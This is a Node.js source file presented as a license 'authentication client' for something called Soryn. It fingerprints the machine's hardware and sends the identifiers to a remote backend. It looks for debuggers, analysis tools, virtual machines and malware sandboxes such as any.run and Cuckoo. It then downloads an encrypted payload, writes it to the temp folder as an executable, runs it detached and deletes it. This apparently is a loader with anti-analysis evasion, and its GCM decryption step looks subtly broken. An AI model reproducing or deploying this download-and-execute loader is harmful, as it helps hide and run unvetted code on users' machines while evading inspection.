/**
 * Soryn Authentication Client
 * Handles all authentication through the secure backend server
 * ALL validation logic moved to backend - client only collects hardware info
 */

const { execSync } = require('child_process');
const crypto = require('crypto');
const os = require('os');
const fs = require('fs');
const path = require('path');

class SorynAuthClient {
    constructor(backendUrl) {
        this.backendUrl = backendUrl || 'https://backend-server-trhh.onrender.com';
        this.token = null;
        this.sessionId = null;
        this.hwid = null;
        this.displayName = null;
        this.isCompromised = false;
    }

    /**
     * Get Windows Machine GUID from registry
     */
    getMachineGUID() {
        try {
            const result = execSync('reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid', { encoding: 'utf8' });
            const match = result.match(/MachineGuid\s+REG_SZ\s+([A-F0-9-]+)/i);
            return match ? match[1] : null;
        } catch (error) {
            console.error('Failed to get Machine GUID:', error.message);
            return null;
        }
    }

    /**
     * Get CPU information
     */
    getCPUInfo() {
        try {
            const result = execSync('wmic cpu get ProcessorId /value', { encoding: 'utf8' });
            const match = result.match(/ProcessorId=([A-F0-9]+)/i);
            return match ? match[1] : null;
        } catch (error) {
            console.error('Failed to get CPU ID:', error.message);
            return null;
        }
    }

    /**
     * Get disk serial numbers
     */
    getDiskSerials() {
        try {
            const result = execSync('wmic diskdrive get SerialNumber /value', { encoding: 'utf8' });
            const serials = result.match(/SerialNumber=([^\r\n]+)/gi);
            return serials ? serials.map(s => s.replace('SerialNumber=', '').trim()).filter(s => s && s !== '0') : [];
        } catch (error) {
            console.error('Failed to get disk serials:', error.message);
            return [];
        }
    }

    /**
     * Get motherboard serial
     */
    getMotherboardSerial() {
        try {
            const result = execSync('wmic baseboard get SerialNumber /value', { encoding: 'utf8' });
            const match = result.match(/SerialNumber=([^\r\n]+)/i);
            return match ? match[1].trim() : null;
        } catch (error) {
            console.error('Failed to get motherboard serial:', error.message);
            return null;
        }
    }

    /**
     * Get network adapter MAC addresses
     */
    getNetworkMACs() {
        try {
            const result = execSync('wmic nic get MACAddress /value', { encoding: 'utf8' });
            const macs = result.match(/MACAddress=([A-F0-9:]+)/gi);
            return macs ? macs.map(m => m.replace('MACAddress=', '').trim()).filter(m => m && m !== '00:00:00:00:00:00') : [];
        } catch (error) {
            console.error('Failed to get network MACs:', error.message);
            return [];
        }
    }

    /**
     * Get Windows username (for display purposes only)
     */
    getUsername() {
        try {
            return os.userInfo().username;
        } catch (error) {
            return 'unknown';
        }
    }

    /**
     * Collect hardware information for backend validation
     */
    collectHardwareInfo() {
        return {
            machineGUID: this.getMachineGUID(),
            cpuId: this.getCPUInfo(),
            diskSerials: this.getDiskSerials(),
            motherboardSerial: this.getMotherboardSerial(),
            networkMACs: this.getNetworkMACs(),
            displayName: this.getUsername()
        };
    }

    /**
     * Collect basic security indicators (backend will do the real validation)
     */
    collectSecurityIndicators() {
        const indicators = {
            debuggerDetected: false,
            vmDetected: false,
            sandboxDetected: false,
            timingAnomaly: false
        };

        // Basic detection - backend will validate these
        try {
            const result = execSync('tasklist /FO CSV', { encoding: 'utf8' });
            const runningProcesses = result.toLowerCase();
            
            // Canonical debugger process list
            const debuggers = [
                "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
                "idaq.exe", "idaq64.exe", "ghidra.exe", "cutter.exe", "radare2.exe",
                "windbg.exe", "immunity debugger.exe", "cheat engine.exe", "artmoney.exe", "gamehack.exe",
                "wireshark.exe", "fiddler.exe", "charles.exe", "httpdebugger.exe", "burpsuite.exe",
                "process hacker.exe", "processhacker.exe", "process explorer.exe", "procmon.exe", "procexp.exe",
                "dnspy.exe", "dnspy-netcore.exe", "de4dot.exe", "ilspy.exe", "dotpeek.exe",
                "justdecompile.exe", "reflexil.exe", "reshacker.exe", "extremedumper.exe", "scylla.exe",
                "pe-bear.exe", "reclass.net.exe", "megadumper.exe", "xenos.exe", "GH Injector.exe"
            ];
            for (const debuggerTool of debuggers) {
                if (runningProcesses.includes(debuggerTool)) {
                    indicators.debuggerDetected = true;
                    break;
                }
            }

            // Comprehensive VM indicator list
            const vmIndicators = [
                "vmware", "virtualbox", "qemu", "xen", "hyper-v",
                "parallels", "virtual machine", "vbox", "microsoft corporation", "virtualpc",
                "bochs", "wine", "citrix", "kvm", "vmm",
                "red hat", "oracle", "vm tools", "guest additions", "sandboxie",
                "docker", "wsl", "proxmox", "openvz", "cloud hypervisor",
                "nutanix", "scale computing", "clearvm", "azure vm", "amazon ec2",
                "google cloud", "oracle vm server", "ibm cloud", "smartos", "ovirt",
                "virt-manager", "vagrant", "nomad", "cloudstack", "virtio",
                "bhyve", "xcp-ng", "vmware workstation", "vmware esxi", "vmware fusion",
                "parallels desktop", "citrix hypervisor", "red hat virtualization", "hyperkit", "veertu anka",
                "nimbula", "lxc", "lxqt", "podman", "any.run",
                "joesandbox", "cuckoo", "gvisor", "kata containers", "firecracker"
            ];
            // Manufacturer, product name, BIOS info
            const manufacturer = execSync('wmic computersystem get manufacturer /value', { encoding: 'utf8' });
            const product = execSync('wmic computersystem get model /value', { encoding: 'utf8' });
            const bios = execSync('wmic bios get smbiosbiosversion /value', { encoding: 'utf8' });
            for (const vm of vmIndicators) {
                if (
                    manufacturer.toLowerCase().includes(vm) ||
                    product.toLowerCase().includes(vm) ||
                    bios.toLowerCase().includes(vm)
                ) {
                    indicators.vmDetected = true;
                    break;
                }
            }
            // Registry keys (stub)
            // TODO: Implement registry key checks for VM indicators
            // System files (stub)
            // TODO: Implement system file checks for VM indicators
            // MAC addresses (stub)
            // TODO: Implement MAC address checks for VM indicators
        } catch (error) {
            console.error('Security indicator collection failed:', error.message);
        }

        return indicators;
    }

    /**
     * Comprehensive license validation using backend
     */
    async validateKey(key) {
        try {
            const hardwareInfo = this.collectHardwareInfo();
            const securityChecks = this.collectSecurityIndicators();
            
            const url = `${this.backendUrl}/api/comprehensive-validate`;
            const body = JSON.stringify({ 
                key, 
                ...hardwareInfo,
                securityChecks,
                platform: os.platform(),
                arch: os.arch()
            });
            
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body
            });

            const text = await response.text();
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                throw new Error(`Server did not return JSON: ${text}`);
            }

            if (data.success) {
                this.token = data.token;
                this.sessionId = data.sessionId;
                this.hwid = data.hwid;
                this.displayName = hardwareInfo.displayName;
                
                return { 
                    success: true, 
                    message: data.message, 
                    sessionId: this.sessionId,
                    hwid: this.hwid,
                    securityStatus: data.securityStatus,
                    payloadMetadata: data.payloadMetadata
                };
            } else {
                return { success: false, error: data.error || 'Validation failed' };
            }
        } catch (error) {
            console.error('Comprehensive validation error:', error);
            return { success: false, error: error.message || 'Network error or server unavailable' };
        }
    }

    /**
     * Fetch encrypted payload from server with backend validation
     */
    async fetchEncryptedPayload(licenseKey) {
        try {
            const hardwareInfo = this.collectHardwareInfo();
            const securityChecks = this.collectSecurityIndicators();
            
            const response = await fetch(`${this.backendUrl}/api/secure-payload`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    key: licenseKey,
                    hwid: this.hwid,
                    platform: os.platform(),
                    arch: os.arch(),
                    ...hardwareInfo,
                    securityChecks
                })
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`Server responded with ${response.status}: ${errorText}`);
            }

            const encryptedData = await response.arrayBuffer();
            return Buffer.from(encryptedData);
        } catch (error) {
            console.error('Failed to fetch encrypted payload:', error.message);
            throw error;
        }
    }

    /**
     * Decrypt payload using AES-256-GCM
     */
    decryptPayload(encryptedBuffer, encryptionKey) {
        try {
            // Extract IV (first 16 bytes) and encrypted data
            const iv = encryptedBuffer.slice(0, 16);
            const encryptedData = encryptedBuffer.slice(16);
            
            // Convert hex key to buffer
            const keyBuffer = Buffer.from(encryptionKey, 'hex');
            
            // Create decipher
            const decipher = crypto.createDecipheriv('aes-256-gcm', keyBuffer, iv);
            
            // Decrypt
            let decrypted = decipher.update(encryptedData);
            decrypted = Buffer.concat([decrypted, decipher.final()]);
            
            return decrypted;
        } catch (error) {
            console.error('Payload decryption failed:', error.message);
            throw new Error('Failed to decrypt payload');
        }
    }

    /**
     * Execute payload from memory (simplified - backend handles validation)
     */
    async executeFromMemory(payloadBuffer) {
        try {
            // Write to temporary file and execute
            const tempPath = path.join(os.tmpdir(), `soryn_${Date.now()}.exe`);
            fs.writeFileSync(tempPath, payloadBuffer);
            
            // Make executable (on Unix systems)
            if (os.platform() !== 'win32') {
                fs.chmodSync(tempPath, '755');
            }
            
            // Execute
            const { spawn } = require('child_process');
            const process = spawn(tempPath, [], {
                detached: true,
                stdio: 'ignore'
            });
            
            // Clean up temp file after a delay
            setTimeout(() => {
                try {
                    fs.unlinkSync(tempPath);
                } catch (e) {
                    // Ignore cleanup errors
                }
            }, 5000);
            
            return process;
        } catch (error) {
            console.error('Failed to execute payload:', error.message);
            throw error;
        }
    }

    /**
     * Load and execute encrypted payload with backend validation
     */
    async loadAndExecute(licenseKey, encryptionKey, expectedHash = null) {
        try {
            console.log('Fetching encrypted payload with backend validation...');
            const encryptedPayload = await this.fetchEncryptedPayload(licenseKey);

            console.log('Decrypting payload...');
            const decryptedPayload = this.decryptPayload(encryptedPayload, encryptionKey);

            if (expectedHash) {
                const actualHash = crypto.createHash('sha256').update(decryptedPayload).digest('hex');
                if (actualHash !== expectedHash) {
                    throw new Error('Payload integrity check failed');
                }
            }

            console.log('Executing payload from memory...');
            const process = await this.executeFromMemory(decryptedPayload);

            return {
                success: true,
                process: process,
                message: 'Payload executed successfully'
            };
        } catch (error) {
            console.error('Failed to load and execute payload:', error.message);
            return {
                success: false,
                error: error.message
            };
        }
    }

    /**
     * Check session status with backend
     */
    async checkStatus() {
        if (!this.token) {
            return { success: false, error: 'No active session' };
        }

        try {
            const response = await fetch(`${this.backendUrl}/api/check-status`, {
                headers: {
                    'Authorization': `Bearer ${this.token}`
                }
            });

            const data = await response.json();
            return data;
        } catch (error) {
            console.error('Status check failed:', error.message);
            return { success: false, error: error.message };
        }
    }

    /**
     * Logout and end session
     */
    async logout() {
        if (!this.token) {
            return { success: true, message: 'No active session' };
        }

        try {
            const response = await fetch(`${this.backendUrl}/api/logout`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${this.token}`
                }
            });

            const data = await response.json();
            if (data.success) {
                this.clearSession();
            }
            return data;
        } catch (error) {
            console.error('Logout failed:', error.message);
            return { success: false, error: error.message };
        }
    }

    /**
     * Clear local session data
     */
    clearSession() {
        this.token = null;
        this.sessionId = null;
        this.hwid = null;
        this.displayName = null;
    }

    /**
     * Check if user is authenticated
     */
    isAuthenticated() {
        return !!(this.token && this.sessionId);
    }

    /**
     * Get session information
     */
    getSessionInfo() {
        return {
            isAuthenticated: this.isAuthenticated(),
            sessionId: this.sessionId,
            hwid: this.hwid,
            displayName: this.displayName,
            token: this.token ? '***' : null
        };
    }

    /**
     * Test backend connection
     */
    async testConnection() {
        try {
            const response = await fetch(`${this.backendUrl}/api/health`);
            const data = await response.json();
            return { success: true, data };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    /**
     * Get security status (simplified - backend handles real validation)
     */
    getSecurityStatus() {
        return {
            isCompromised: this.isCompromised,
            hardwareInfo: this.collectHardwareInfo(),
            securityIndicators: this.collectSecurityIndicators()
        };
    }
}

    module.exports = SorynAuthClient;